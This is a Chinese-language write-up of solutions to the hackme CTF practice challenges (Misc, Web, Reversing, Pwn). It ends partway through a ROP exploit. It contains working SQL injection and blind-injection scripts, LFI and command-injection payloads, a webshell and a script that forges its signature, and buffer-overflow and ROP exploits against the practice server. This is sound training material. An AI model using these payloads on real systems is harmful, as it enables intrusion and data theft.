---
title: HackMe Writeup

---

# HackMe Writeup
此WriteUp的完整程式碼於此[GitHub](https://github.com/NarouMas/CTF-Writeup)中

如果你是從 github 看到這篇 md 的人，可以從[這裡](https://hackmd.io/@NarouMas/Sk6ghF18K)，連到 hackmd 頁面

# Misc
## 1 flag
摁... flag就已經在那邊了

## 2 corgi can fly
用Stegsolve開起來後切到Red plane 0後掃QR code

## 3 television
用strings搜尋就出來了

## 4 meow
一個正常png檔的結尾應該是[0xae, 0x42, 0x60, 0x82]，但這個圖檔卻不是。再觀察正常檔尾後的二進位碼發現是zip檔的開頭，所以先寫一個程式將其分開。
```python=
def main():
    f = open('./asset/meow.png', 'rb')
    data = f.read()
    png_end_data = [0xae, 0x42, 0x60, 0x82]
    for i in range(len(data)):
        flag = True
        for j in range(len(png_end_data)):
            if data[i + j] != png_end_data[j]:
                flag = False
                break
        if flag:
            zip_file = open('./asset/meow.zip', 'wb')
            for j in range(i + 4, len(data)):
                zip_file.write(data[j].to_bytes(1, byteorder='little'))
            png_file = open("./asset/pure_meow.png", 'wb')
            for j in range(i + 4):
                png_file.write(data[j].to_bytes(1, byteorder='little'))

            return
```

分割後發現壓縮檔還帶有密碼，觀察壓縮檔內的圖檔CRC檢查碼為CDAD52BD，若將上一步驟分割出的圖檔也壓縮為"plain.zip"，發現其CRC檢查碼也為CDAD52BD。

因此可以使用pkcrack的明文破解方式來進行破解
```
./pkcrack -C meow.zip -c "meow/t39.1997-6/p296x100/10173502_279586372215628_1950740854_n.png" -P plain.zip -p pure_meow.png -d result.zip -a
```
輸入命令後，即可在result.zip中看到flag

## 5 where is flag
用正規表達式來找出檔案中的flag
```python=
f = open('./asset/flag', 'r')
data = f.read()
f.close()
regex = re.compile('FLAG\{\w+\}')
match = regex.search(data)
print(match.group(0))
```

## 6 encoder
可以根據檔案的第一個數字來判斷編碼法是rot13, base64, hex, upsidedown。知道之後就慢慢寫程式反覆進行反編碼後直到開頭不是0,1,2,3就好

## 7 slow
每多猜對一個字，print 出 Bye 所需的時間就會多加一秒，知道這個規則後就可以寫 script 慢慢去爆破了
```python=
flag = "FLAG{"
char_set = "0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ}"
for _ in range(60):
    for c in char_set:
        start_time = time.time()
        r = remote("ctf.hackme.quest", 7708)
        r.recvuntil(b'What is your flag? ')
        r.sendline((flag + c).encode('ascii'))
        r.recvuntil(b'Bye')
        r.close()

        end_time = time.time()
        connection_time = end_time - start_time
        print(f"Connection time: {connection_time} seconds, target time: {len(flag) + 2}, try: {c}, current flag: {flag}")

        if connection_time >= len(flag) + 2:
            flag += c
            print("char find, current flag:", flag)
            if c == '}':
                print("The whole flag is found:", flag)
                return
            break
```

## 8 pusheen.txt
觀察之後會發現裡面就只有兩種貓重複出現，然後一個當0一個當1，binary再解碼成ascii就可以了

## 9 big
檔案下載解壓縮兩次之後會是一個16GB的檔案...

接著就也沒甚麼技巧，慢慢讀就好了
```python=
f = open("./asset/big~", 'r')
while True:
    content = f.read(16)
    if content != 'THISisNOTFLAG{}\n':
        print(content)
        content = f.read(1000)
        print(content)
        input()
```

## 12 drvtry vpfr
把 G:SH}Djogy <u Lrunpstf Smf Yu[omh Dp,ryjomh| 依鍵盤位置向左位移一格

## 14 zipfile
題目給了一個十分難搞的zip檔，可以先用以下的code來做初步的解壓縮
```python=
while True:
    zf = zipfile.ZipFile('./zip/zipfile.zip', 'r')
    zf.extractall()
    zf.close()
    os.remove('./zip/zipfile.zip')
    os.replace("./zipfile.zip", "./zip/zipfile.zip")
```
最後會以例外來強制解除執行，因為接下來的zip檔要使用別種方式來做處理

接下來可以使用以下程式碼來解出隱藏在壓縮檔中的文字
```python=
target_zip_file = zipfile.ZipFile('./zip/zipfile.zip', 'r')
flag = ''

# because the dir in the zip file contain with 8 bit 2 binary number
for i in range(256):
    # 0 -> 00000000
    target_name = bin(i)[2:].zfill(8)
    # 01010101 -> 0/1/0/1/0/1/0/1
    target_name = '/'.join(target_name)

    #print(target_name)
    print('[', end='')
    little_flag = []
    for info in target_zip_file.infolist():
        if target_name != info.filename[-18:-3]:
            continue

        # read 0/1/0/1/0/1/0/1PK and create temp file
        data = target_zip_file.read(info)
        f = open('./temp', 'wb')
        f.write(data)
        f.close()

        target = './temp'
        # unzip the first zip
        zfile = zipfile.ZipFile(target, 'r')
        # print(zfile.namelist())    # file name like 'Î¨ä·¼ºÔ½¤\x8bÒ±ÂÄ\x87\x9fÄ\x9c\x90'
        for filename in zfile.namelist():
            d = zfile.read(filename)
            f2 = open('./temp2', 'wb')
            f2.write(d)
            f2.close()

        # second zip
        zfile = zipfile.ZipFile('./temp2', 'r')
        d = []
        dd = []
        for info_ in zfile.infolist():
            d.append(zfile.read(info_))

        #print(d)
        for j in range(len(d)):
            dd.append([])
            for k in range(len(d[j])):
                dd[j].append(d[j][k])
        #print(dd)

        s = []
        for j in range(len(dd[0])):
            t = 0
            for k in range(len(dd)):
                t = t ^ d[k][j]

            s.append(t)
        for j in range(len(s)):
            print(chr(s[j]), end='')
        print(',', end='')

    print(']')
```

從輸出中可以觀察到第二列的文字具有意義，將輸出複製至檔案中還原出flag
```python=
f = open('./zip/output.txt', 'r')
data = f.readlines()
f.close()
#print(data)
for i in range(len(data)):
    data[i] = data[i][1:-2]
    s = data[i].split(',')
    print(s[1], end='')
```

reference:[hackme.inndy.tw Misc zipfile Writeup](https://l1b0.github.io/126054f9/)

# Web
## 15 hide and seek
F12看原始碼

## 16 guestbook
載sqlmap之後先隨便送個post出去，然後從message list看到剛剛的post後觀察網址有注入點的可能性，丟到sqlmap 去跑

python sqlmap.py -u "https://ctf.hackme.quest/gb/?mod=read&id=85" --batch --dbs

查資料庫料表

python sqlmap.py -u "https://ctf.hackme.quest/gb/?mod=read&id=85" --batch --tables -D g8

指定g8資料庫後查table表

python sqlmap.py -u "https://ctf.hackme.quest/gb/?mod=read&id=85" --batch --dump flag -D g8

顯示資料，然後就有flag了

## 17 LFI
用php://filter/來讀檔案
一開始先用

https://ctf.hackme.quest/lfi/?page=php://filter//read=convert.base64-encode/resource=pages/flag

base64解碼後得到:"Can you read the flag<?php require('config.php'); ?>?"
再用

https://ctf.hackme.quest/lfi/?page=php://filter//read=convert.base64-encode/resource=pages/config

讀，base64解碼後就是flag了

## 18 homepage
按F12打開主控台掃描QR code

## 19 ping
反引號"\`"沒有在黑名單裡，可以利用這個來執行想要執行的其他指令
先嘗試\`ls\`後得到有flag.php檔案
再用\`sort \?\?\?\?\?\?\?\?\`得出內容

## 20 scoreboard
F12後換到網路，打開scoreboard的標頭，可以發現flag藏在x-flag裡

## 21 login as admin 0
要使用sql injection來做登入的動作，可以先看一下網頁原始碼
``` php=
function safe_filter($str)
{
    $strl = strtolower($str);
    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||
        strstr($strl, 'update') || strstr($strl, 'delete')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
}

$_POST = array_map(safe_filter, $_POST);
```

他會把常使用到的 or 1=1給擋掉， 因此可把恆正表示改為 or 2=2

除此之外，他也會把" ' "給替換為" \\\\' "，此處可改為輸入" \\' "來繞開這個檢測

嘗試輸入 "\\' or 2=2#"，結果發現依舊是以guest身分登入

加上 order by user嘗試改變return的資料順序後就發現是以admin登入了

## 22 login as admin 0.1
和上一題是同樣的網站，但是要找到藏在資料庫裡的flag

找到query的列數與會回顯的列

```admin\' union select 1,2,3,4 #```

發現2會回顯

找到資料庫的名稱為"login_as_admin0"

```admin\' union select 1,(SELECT database()),3,4 #```

找到table的名稱為"h1dden_f14g"

```admin\' union select 1,group_concat(TABLE_NAME),3,4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="login_as_admin0"#```


找到column的名稱 "the_f14g"

```admin\' union select 1,group_concat(COLUMN_NAME),3,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="h1dden_f14g"#```

找到flag~~

```admin\' union select 1,group_concat(the_f14g),3,4 FROM h1dden_f14g#```

## 23 login as admin 1
要以isadmin為True的狀態登入，然後此題的空白字元會被限制，可以使用\"/\*\*/\"來繞過。

可輸入"admin\\'or\/\*\*\/isadmin#"來進行登入

## 24 login as admin 1.2
先使用 order by確定查詢的column數"aaa\\'/\*\*/or/\*\*/isadmin/\*\*/order/\*\*/by/\*\*/4#"

然後isadmin位於第四個欄位，所以接著於第四個使用boolean injection來爆出table name
```python=
import requests
table = ''
query = r"aaa\'/**/union/**/select/**/1,2,3,ascii(substr(group_concat(table_name),{},1))={}/**/from/**/information_schema.tables/**/where/**/table_schema=database()#"

for pos in range(50):
    for char in range(32, 127):
        post = {"name": query.format(pos, char), "password": "123"}
        ret = requests.post("https://ctf.hackme.quest/login1/", post).text

        if "You are admin!" in ret:
            table += chr(char)
            print(chr(char), end='')
            break
print(table)
# 0bdb54c98123f5526ccaed982d2006a9,users
```

接下來來爆出column name
```python=
query = r'aaa\'/**/union/**/select/**/1,2,3,ascii(substr(group_concat(column_name),{},1))={}/**/from/**/information_schema.columns/**/where/**/table_name="0bdb54c98123f5526ccaed982d2006a9"#'
#4a391a11cfa831ca740cf8d00782f3a6,id
```

最後爆出flag
```python=
query = r'aaa\'/**/union/**/select/**/1,2,3,ascii(substr(group_concat(4a391a11cfa831ca740cf8d00782f3a6),{},1))={}/**/from/**/0bdb54c98123f5526ccaed982d2006a9#'
```


## 25 login as admin 3
這題使用到了php的weak comparison。

當php進行下列比較時會return ture
```php=
"php" == true;
```

因此將cookie中的admin資料改為true，sig的資料也改為true後，伺服端進行比對時便會return true。

## 26 login as admin 4
可使用curl來繞過header的Redirect
```cmd=
curl -d "name=admin" https://ctf.hackme.quest/login4/
```

或者可以使用python的request並disallow掉redirect
```python=
import requests

url = 'https://ctf.hackme.quest/login4/'
post = {'name': 'admin'}
ret = requests.post(url, post, allow_redirects=False)
print(ret.text)
```

## 27 login as admin 6
在使用extract($data)時，原有的變數內容會被data中的資料所覆蓋。
因此將表單中hidden標籤中的內容修改如下便可。
```htmlembedded=
<input type="hidden" name="data" id="data" value='{"username":"admin","password":"123", "users":{"admin": "123", "guest": "guest"}}'>
```

{"username":"admin","password":"123", "users":{"admin": "123", "guest": "guest"}}

## 28 login as admin 7
如果0e開頭的字串與"000000"...進行弱比較時會視為相等，因此只要找到經過md5後開頭為0e的字串便可。

可參考下方之值
```
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469

```

## 29 login as admin 8
先以guest/guest登入後觀察login8cookie 和 login8sha512 cookie，其中login8cookie是以url encoded，解碼後將is_admin改為1並做sha512修改cookie。

由於%00 null byte的問題，直接進行複製有可能會出錯，可以至[SHA512](https://emn178.github.io/online-tools/sha512.html)開啟dev tool並使用sha512(decodeURIComponent(cookie))

## 30 login as admin 8.1
請參考此[網站](https://blog.maple3142.net/2020/07/23/hackme-ctf-experience-and-hints/#login-as-admin-8.1)

## 31 dafuq-manager 1
進去之後先以guest/guest登入，接著有個"see-me-if-you-need-tips.txt"的文件告訴我們要創建一個key為help，value為me的cookie。

創建並重新載入後他便問你是否會修改cookie，此時會發現cookie中有一個show hidden的cookie，把value改為yes就可以了。

## 32 dafuq-manager 2
在edit file的地方發現他直接將檔案位置已get參數傳遞，嘗試將參數改為".\./.\./.config/.htusers.php"就可以看到user的帳號及密碼。

不過密碼是被md5雜湊過的，這裡可以使用[CrackStation](https://crackstation.net/)這個工具來還原

## 33 dafuq-manager 3
這題他告訴你要使用到shell，在程式碼中找了一下發現"debug.php"中有"exec"的相關字眼，所以應該是要從這邊來開始進行。

一開始先將首頁的action改為debug後進入debug頁面

接著修改"dir"參數來避開"You are not hacky enough :("錯誤，可使用dir[]=0

接著最後就是要輸入指令了，但是exec在黑名單中，不過php可藉由字串來呼叫函式，因此可使用下列指令
```php=
$command = '$a = "ex"; $b = "ec"; $c = $a.$b; echo $c("cd /var/www/webhdisk/flag3/ && ./meow ./flag3");';
```
下一步是要知道他加密所使用的key，但這不困難，可以在.config裡的conf.php中找到

最後可以編寫出以下的script
```php=
<?php
$command = '$a = "ex"; $b = "ec"; $c = $a.$b; echo $c("cd /var/www/webhdisk/flag3/ && ./meow ./flag3");';
$secret_key = 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3';
$hmac = hash_hmac('sha256', $command, $secret_key);
$url='https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&dir[]=1&command='.urlencode(base64_encode($command) . ".".$hmac).'<br/>';
echo $url;
?>
```
## 36 webshell
一開始看到的 php 被編碼起來了，把 code 放到自己的環境還原一下可以看到下面的 code
```php=
<?php
function run()
{ 
	if(isset($_GET['cmd']) && isset($_GET['sig'])) 
	{
		$cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd']; 
		$key = $_SERVER['HTTP_USER_AGENT'] . sha1($_SERVER['HTTP_HOST']);
	 	$sig = hash_hmac('SHA512', $cmd, $key);
	  	if($sig === (string)$_GET['sig'])
	  	{
	  		header('Content-Type: text/plain');
	   		return !!system($cmd);
	   	} 
	}
	return false; 
} 
function fuck()
{
	print(str_repeat("\n", 4096)); 
	readfile($_SERVER['SCRIPT_FILENAME']); 
} 
run() ?: fuck();
?>
```
裡面可以看到說，要用 get 輸入 cmd 還有 sig 欄位，然後 sig 就是用一些欄位算出來的，這些資訊都可以取得，就適當的替代一下就可以了，比較麻煩的是 cmd 的部分， server 端是將 xor 後的 command 再拿去執行的，所以一開始輸入的 command 應該是要先被 xor 好的，如此一來，再 xor 過一次後就會還原回你真正想輸入的指令。
可透過下列命令取得對應的 cmd 跟 sig
```php=
<?php
$remote_addr = '<your_ip>';
$host = 'webshell.hackme.quest';
$input_cmd = hash('SHA512', $remote_addr) ^ '<command>'; 

echo 'cmd:';
for($i = 0; $i < strlen($input_cmd); $i++){
	$num = ord($input_cmd[$i]);
	if($num < 16)
		echo '%0'.dechex($num);
	else
		echo '%'.dechex($num);
}
echo '<br>';
$cmd = $input_cmd;
$cmd = hash('SHA512', $remote_addr) ^ (string)$cmd;
$key = $_SERVER['HTTP_USER_AGENT'] . sha1($host);
$sig = hash_hmac('SHA512', $cmd, $key);
echo 'sig:'.$sig.'<br>';

?>
```

接下來就是慢慢找 flag 了

可以先用 ' find / -name "\*flag\*" '，來找出系統中名稱帶有 flag 的檔案然後再用'cat /var/www/html/.htflag' 看到真正的 flag



# Reversing
## 41 helloworld
打開程式之後要輸入一串正確的數字，反編譯過後發現程式會將輸入與12B9B0A1進行比較，把他轉為十進位後輸入就可以了。

![](https://i.imgur.com/vHCCIAq.png)

## 42 simple
這一題可以先注意到有個UIJT.JT.ZPVS.GMBH的字串

![](https://i.imgur.com/36kwK2J.png)

點進去之後題目還很貼心的提示你有沒有聽過凱薩加密

![](https://i.imgur.com/3j7XaQY.png)

拿去解密後也就差不多做完了

不過也是可以認真來看一下反組譯過後的程式碼

![](https://i.imgur.com/rqoSeQy.png)

首先這個區塊將使用者的輸入放入了var_4C的變數，為了後續閱讀方便，我將他重新命名為input

![](https://i.imgur.com/8uFsqUE.png)

接著下面區塊是在比較當前index的輸入是否為'\0'，var_C可視作為for迴圈中的i

![](https://i.imgur.com/T8j7jUt.png)

此部分在比較當前index的輸入是否為換行(對應的ascii碼為0Ah)

![](https://i.imgur.com/ojK4e19.png)

如果比較結果不相等，則將當前index的輸入+1後放入到var_8C變數字串中，後續將此變數命名為decoded_string

![](https://i.imgur.com/n2bpKXs.png)

如果相等(表示為換行)，則將該位置填為'\0'

![](https://i.imgur.com/9WTEVFX.png)


將i加1

![](https://i.imgur.com/0oxVnvc.png)


將整個輸入字串處理完後會將decoded_string與aUijtJtZpvsGmbh做比較，此處呼叫_strcmp進行比較，比較的回傳值會放置於eax

![](https://i.imgur.com/Bdm3fB9.png)

最後，若兩字串相等便print出flag，否則print出Try hard.

## 43 passthis
一開始使用ida反編譯時找不到main函式，改使用r2後成功找到main函式位於0x00402760的位置

![](https://i.imgur.com/CVmEzqD.png)

切回到ida並找到對應位置後，前面有一長串沒用的程式碼...，可以直接略過從"Let me check your flag:"的地方開始看

下面的code看過之後發現程式會對下面變數的位置做xor，點進去之後將資料複製做xor，flag就會出現了

![](https://i.imgur.com/n7RjnYl.png)


```python=
data = [0xc1, 0xcb, 0xc6, 0xc0, 0xfc, 0xc9, 0xe8, 0xab, 0xa7, 0xde, 0xe8, 0xf2, 0xa7, 0xf4, 0xef, 0xe8, 0xf2, 0xeb,
        0xe3, 0xa7, 0xe9, 0xe8, 0xf3, 0xa7, 0xf7, 0xe6, 0xf4, 0xf4, 0xa7, 0xf3, 0xef, 0xe2, 0xa7, 0xe1, 0xeb, 0xe6,
        0xe0, 0xfa]

for i in range(len(data)):
    print(chr(data[i] ^ 0x87), end='')

```

## 44 pyyy
從題目一開始下載下來的是.pyc檔，先將其反編譯為.py檔
```
pip install uncompyle6
uncompyle6 -o pyyy.py pyyy.pyc
```
藉由以上指令可得到.py檔，不過反編譯出來的程式碼是python 2的版本，需要略為修改才能正常執行。

執行程式時會因為遞迴次數過多導致終止，觀察後可以發現元凶在這一個部分
```python=
lambda f: lambda x: 1 if x < 2 else f(x - 1) * x % n
```
分析此部分後，可以發現其實這就只是一個計算階乘的功用，修改寫法後，再將後面輸入的地方註解掉就可以了
```python=
l = (lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(
        lambda f: lambda x: math.factorial(x) % n)(g % 27777)
```

## 45 accumulator
程式在比對flag時，會先將一個變數中的值加到比對的文字中，比對完畢後，再將此加總過後的值儲存回該變數中。

因此只需要將儲存的資料值，一一將後面減去前面，得到差值，即可得到flag

## 46 GCCC
這一題的程式似乎無法使用IDA或是r2來反編譯，可以使用dotPeek來反編譯，反編譯後發現程式會將輸入值進行一連串的運算後得出flag，此處可使用z3來求解result的值
```python=
from z3 import *


def main():
    data = bytearray([164, 25, 4, 130, 126, 158, 91, 199, 173, 252, 239, 143, 150,
                          251, 126, 39, 104, 104, 146, 208, 249, 9, 219, 208, 101, 182, 62, 92, 6, 27, 5, 46])
    chrs = list('ABCDEFGHIJKLMNOPQRSTUVWXYZ{} ')
    s = Solver()
    result = BitVec('result', 32 + 8)
    num = 0

    for i in range(32):
        c = data[i] ^ Extract(i + 7, i, result) ^ num
        if i < 5:
            x = list("FLAG{")
            s.add(c == ord(x[i]))
        elif i == 31:
            s.add((c == ord('}')))
        else:
            s.add(Or([c == ord(x) for x in chrs]))
        num = num ^ data[i]

    if s.check().__str__() == 'sat':
        print(s.model())
    else:
        print('no ans')


if __name__ == '__main__':
    main()

# reference: https://blog.maple3142.net/2020/07/23/hackme-ctf-experience-and-hints/#gccc
```

## 47 ccc
反編譯後便可以看到程式檢查flag的規則，接下來就沒甚麼好說的，寫script開始暴力破解，破解時，可進行適當的猜測來加快速度
```python=
crc32_tab = []
hashes = []


def main():
    global crc32_tab, hashes
    f = open("./asset/ccc/crc32_tab.txt", "r")
    content = f.readlines()
    f.close()
    for i in range(len(content)):
        data = content[i]
        data = data[38:]
        data = data.split(',')
        for j in range(3):
            crc32_tab.append(int(data[j][:-1], 16))
        crc32_tab.append(int(data[3][:-2], 16))
    f = open('./asset/ccc/hashes.txt', 'r')
    content = f.readlines()
    f.close()
    for i in range(len(content)):
        data = content[i]
        data = data[38:]
        data = data.split(',')
        for j in range(3):
            hashes.append(int(data[j][:-1], 16))
        hashes.append(int(data[3][:-2], 16))

    buffer = ''
    a = b = c = 32
    i = 3
    j = 0
    while i < 0x2b:
        iVar1 = crc32(0, buffer + chr(a) + chr(b) + chr(c), i)
        if iVar1 != hashes[j]:
            c += 1
            if c == 127:
                c = 0
                b += 1
            if b == 127:
                b = 0
                a += 1
            if a == 127:
                a = 0
                print('error')
                return

            continue
        j += 1
        i += 3
        buffer = buffer + chr(a) + chr(b) + chr(c)
        a = b = c = 32
        print(buffer)
    print(buffer)


def xor(a, b, last_8_bit=False):
    result = ''
    for i in range(len(b)):
        if a[i] == b[i]:
            result += '0'
        else:
            result += '1'
    if last_8_bit:
        return int(result[-8:], 2)
    return int(result, 2)


def inverse(a):
    result = ''
    for i in range(len(a)):
        if a[i] == '0':
            result += '1'
        else:
            result += '0'
    return result


def right_shift_8(a):
    a = list(a)
    sign = a[0]
    j = len(a) - 1
    for i in range(len(a) - 8):
        a[j] = a[j - 8]
        j -= 1
    for i in range(8):
        a[i] = '0'
    return ''.join(a)


def crc32(num, buffer, index):
    global crc32_tab, hashes
    num = '1' * 32
    i = 0
    while index != 0:
        num = xor("{:032b}".format(crc32_tab[xor("{:032b}".format(ord(buffer[i])), num, True)]), (right_shift_8(num)))
        num = "{:032b}".format(num)

        index -= 1
        i += 1
    return int(inverse(num), 2)


if __name__ == '__main__':
    main()

```

## 48 bitx
反編譯後在0x804A040的位置找到對應的data後依據程式碼的規則慢慢逆出flag就可以了

## 49 2018-rev
執行程式後他要求argc要為2018，argv[0][0]與envp[0][0]為1，argc的部分我自己用python產生了2017個額外引數便可解決，argv與envp則可使用c語言中的execve來指定。

![](https://i.imgur.com/18Kxkv6.png)

這一步通過後他又要求要在2018年的1月1日0點整來執行程式，可再藉由settimeofday函式來改變時間後立刻執行程式即可。

## 50 what-the-hell
程式一開始需要輸入兩個特定的變數，這些檢查條件可以透過使用z3來解決
```python=
a = BitVec('a', 32)
b = BitVec('b', 32)
s = Solver()
s.add(a * b == 0xddc34132)
s.add((a ^ 0x7e) * (b + 0x10) == 0x732092be)
s.add((a - b) & 0xfff == 0xcdf)
s.add()
check = s.check()
print(check)
print(s.model())
```

接著程式會用遞迴的方式算費式數列，接著算出key來，需要改寫一下這邊來自己計算出key(或是你可以等到天荒地老)
```c=
#include<stdio.h>
unsigned long fib[0x98967e];

unsigned int cal_key(unsigned int a, unsigned int b)
{
	unsigned int key, var_c = 1;
	
	while(var_c <= 0x98967e)
	{
		if(var_c > 1)
			fib[var_c] = (fib[var_c - 1] + fib[var_c - 2]) % (1 << 31);	
		else
			fib[var_c] = var_c;
		
		if(fib[var_c] == a)
			return var_c * b + 1;
		else
			var_c += 1;
	
	}
	return 0;
} 

int main()
{
	unsigned int a, b, key;
	a = 2136772529;
	b = 1234567890;
	key = cal_key(a, b);
	printf("a:%u b:%u key:%u\n", a, b, key);
}

```

算出key後，再使用gdb執行程式，在0x804882b修改值來跳過檢查條件，再於後面將eax修改為key便可以得出flag了

## 51 unpackme
程式看起來是有被加過殼，用 ida 看不出甚麼東西，就直接用 x64dbg 來動態分析，然後因為程式有用 VirtualProtect 來修改程式，因此可以在這個 function 下斷點來快速跳到程式真正在執行的地方。
進到程式後有幾個地方需要注意
1. 有個 IsDebuggerPresent function 要把他的 return value 改為 0
2. Check Password 是被 disable 掉的，要修改 esp 中的值使其在呼叫 EnableWindow 時會把 button ebable

接著就直接按 F9 讓程式執行，然後隨便輸入 password 後跳出 messagebox 說 wrong answer，所以接著可以對 messagebox 的相關 function 下斷點來找到進行判斷的程式

找到程式並解析後發現他是對輸入做 md5 雜湊後與記憶體中的值做比較，該指定的值為 34AF0D074B17F44D1BB939765B02776F，對其做 md5 解碼後輸入就可以得出 flag 了

## 52 mov
整個程式幾乎都是透過 mov 來做執行的，不過一開始有調用兩次 sigaction 來讓程式出現 SIGILL 或 SIGSEGV 的時候跳轉的指定位址，不過再意外的嘗試下發現只要輸入的 flag 前面的字是對的話程式就會 print 出 Good flag，所以可以一個一個字慢慢嘗試就好
```python=
flag = "FLAG{"
char_set = "0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}"
for _ in range(60):
    for c in char_set:
        r = process("./asset/mov")
        r.recvuntil(b'Input flag: ')
        r.send((flag + c).encode('ascii'))
        res = r.recvline().decode('ascii')
        r.close()

        if 'Good flag' in res:
            find = True
            flag += c
            print("char find, current flag:", flag)
            if c == '}':
                print("The whole flag is found:", flag)
                return
            break
```

## 53 sha256sum
總之先丟 ida，發現被加殼，從 Segment 名稱看到 .enigma2 ，可以得知說應該是用了 Enigma Protector，但也沒甚麼幫助就是了，接著嘗試用動態解的方法

![image](https://hackmd.io/_uploads/rkLRdXckgl.png)

用 x64dbg 先 F9 跳到 EntryPoint 再開始慢慢分析，啟動的時候記得設定好 Command Line

![image](https://hackmd.io/_uploads/SJMeqXqyxg.png)
```
"D:\download\sha256sum.exe" sha256sum.exe flag.txt
```

Trace 到後面發現他應該是將真正的 code 先 pack 到不知道甚麼地方，然後後面用 Virtual Protect 修改記憶體權限，接著再把 code 給寫進去，接著再 jump 過去

![image](https://hackmd.io/_uploads/HyE69m5ygx.png)

Trace 到下面圖片的地方附近，可以注意到 flag.txt 被作為引數在 CreateFileW function 中被呼叫了，接著再追進 sha256sum.14000122C 看看

![image](https://hackmd.io/_uploads/SJzPiXqyxe.png)

然後可以發現說， flag.txt 的 handle 被作為 argument ，被 ReadFile function 呼叫，所以就在資料視窗中跟隨 outputbuffer 的地址就可以看到 flag.txt 的內容了

![image](https://hackmd.io/_uploads/ByqBTXcJgx.png)

![image](https://hackmd.io/_uploads/HkVNpm5kgx.png)

然而，flag.txt 的內容看得不是很懂，看前面幾個字以為是摩斯密碼，但後面又有出現除了長、短、分隔符外的字，再觀察後發現是 ASCII Art，再整理一下， print 出來就可以看到 flag 了


## 54 a-maze
總之先執行，顯示以下訊息
```
Usage: ./maze input-map hidden-message
```

開 ida 分析，main function 先檢查 argument 數目，再把 map 讀進來，然後跳到 sub_400890，sub_400890 就會開始將輸入做運算，然後與 map 中的資料做比較

![image](https://hackmd.io/_uploads/SkW8l5gxel.png)

運算的方法是將 v2 向左位移 9 位後，再將一個字元 ascii 值乘 4 後相加，再去 map 對應的位置取值，將取到的值作為下一輪的 v2 繼續運算，直到字串遍歷完畢後或從 map 取得的值為 -1。

觀察 map 當中的值可以發現說當中的值還蠻稀疏的，大多都是 0，所以就寫個 queue，將從 map 中取到的值不是 0 的記下，進行搜尋，就可以找出 flag 了。

```python=
f = open("./asset/map", 'rb')
data = f.read()
f.close()
qu = queue.Queue()
qu.put(('', 0))
while not qu.empty():
    flag, n = qu.get()
    for c in range(32, 128):
        v = (data[(n << 9) + (4 * c)]) + (data[(n << 9) + (4 * c) + 1] << 8)
        if v != 0:
            if v == 0xffff:
                print("Find flag:", flag + chr(c))
                exit(0)
            qu.put((flag + chr(c), v))
            print(f"cur:{flag + chr(c)}, data:{v}")
```

## 55 esrever-mv
發現說可以一個字一個字試，但應該不是正統解法，不知道為甚麼我寫的 script 會不穩定，一次可能會試出多個候補，所以需要手動判斷一下。
```python=
charset = [chr(c) for c in range(32, 128)]
flag = ''
while True:
    can = ""
    for c in charset:
        r = process("./asset/esrever-mv")
        data = (flag + c).encode('utf-8')
        r.send(data)
        print("data:", data)
        message = r.recv()
        r.close()
        print("message:", message)
        if message.decode() == 'Input flag: ':
            can += c
            #print("flag:", flag)
    print("flag:", flag)
    print("can:", can)  
    flag += input('intput:')
```

下面是一些不重要的分析心得

VM 在逆向工程裡面，是把原本的 instruction 進行包裝，變成該 VM 特製化的 instruction，在 sub_400FA0 中，是這題 VM 的核心。

VM 便會根據圖中的 switch 去執行 opcode 對應的動作

![image](https://hackmd.io/_uploads/rk5H-THWgl.png)

因此這題的正統解法應該是要去分析每一個 opcode 裡面是做了甚麼事情，再寫程式自動化的去模擬這件事情，但在做這件事之前，因為我找到偷吃步的方法所以就沒有然後了。

# Pwn
## 57 catflag
就直接連上去就好了
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7709)
    r.interactive()
```

## 58 homework
從原始碼可以看出這個地方允許使用者修改任意位置的值

![image alt](https://i.imgur.com/3GEpGpV.png")

可以從這個地方修改return address value到call_me_maybe來開啟shell
先使用r2來查call_me_maybe address的位置

![image alt](https://i.imgur.com/NJZ0IGv.png")

查出了是0x080485fb 轉成十進位後為134514171
下一步就是要計算好offset來讓程式修改到正確的位置
陣列的大小為10個int也就是40byte，換算為16進位後為0x28

![image alt](https://i.imgur.com/lTtaYxK.png")

從變數宣告處0x34扣掉0xc後即為0x28得出陣列位於0x34的位置
接著便可來計算offset
0x34再加上saved rbp的0x4後除4為14即為offset
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7701)
    r.recvuntil(b'name? ')
    r.sendline(b'haha')
    r.recvuntil(b'numbers\n')
    r.recvuntil(b'> ')
    r.sendline(b'1')
    r.recvuntil(b'edit: ')
    r.sendline(b'14')
    r.recvuntil(b'many? ')
    r.sendline(b'134514171')
    r.recvuntil(b'numbers\n')
    r.recvuntil(b'> ')
    r.sendline(b'0')
    r.interactive()
```



## 59 ROP
checksec 一下後發現沒有開啟Canary和PIE，程式又有用gets來做讀取
所以可以直接buffer overflow掉reutrn address
但比較麻煩的是程式裡面沒有直接提供shell的function，所以得自己搞
這時候就要用到ROP的技術，簡單來說就是一直在程式裡面跳來跳去
先下這個指令
```
ROPgadget --binary ./ROP --ropchain
```
然後ROP chain就建好了 Yaaa
接著只需要算個offset就好，讓他可以剛好從return address開始寫
變數的長度為0xc再加上4之後為0x10
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7704)

    # Padding goes here
    p = b'a' * 0x10

    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea060)  # @ .data
    p += pack('<I', 0x080b8016)  # pop eax ; ret
    p += b'/bin'
